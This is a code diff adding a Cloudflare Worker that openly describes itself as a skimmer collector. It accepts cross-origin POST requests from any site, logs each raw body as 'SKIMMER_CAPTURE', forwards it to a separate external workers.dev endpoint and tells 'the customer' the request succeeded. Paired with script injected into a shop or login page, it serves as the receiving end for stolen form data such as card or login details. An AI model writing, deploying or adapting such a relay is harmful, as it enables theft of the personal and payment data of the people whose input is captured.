@@ -1,0 +1,43 @@
+export default {
+  async fetch(request, env, ctx) {
+    // Handle CORS
+    if (request.method === "OPTIONS") {
+      return new Response(null, {
+        headers: {
+          "access-control-allow-origin": "*",
+          "access-control-allow-methods": "POST, GET, OPTIONS",
+          "access-control-allow-headers": "Content-Type",
+        },
+      });
+    }
+
+    if (request.method === "POST") {
+      try {
+        // Read the raw body
+        const rawBody = await request.text();
+        
+        // LOG THIS TO CLOUDFLARE DASHBOARD (Logs Tab)
+        console.log("SKIMMER_CAPTURE:", rawBody);
+
+        // Send to your endpoint
+        const response = await fetch("https://chanfana-openapi-template.joshmccallister1986.workers.dev", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: rawBody,
+        });
+
+        // Return success to the customer
+        return new Response(JSON.stringify({ status: "ok" }), {
+          headers: { "content-type": "application/json" }
+        });
+      } catch (error) {
+        console.error("SKIMMER_ERROR:", error.message);
+        return new Response(JSON.stringify({ error: "Failed" }), { status: 500 });
+      }
+    }
+    
+    return new Response("OK");
+  },
+};
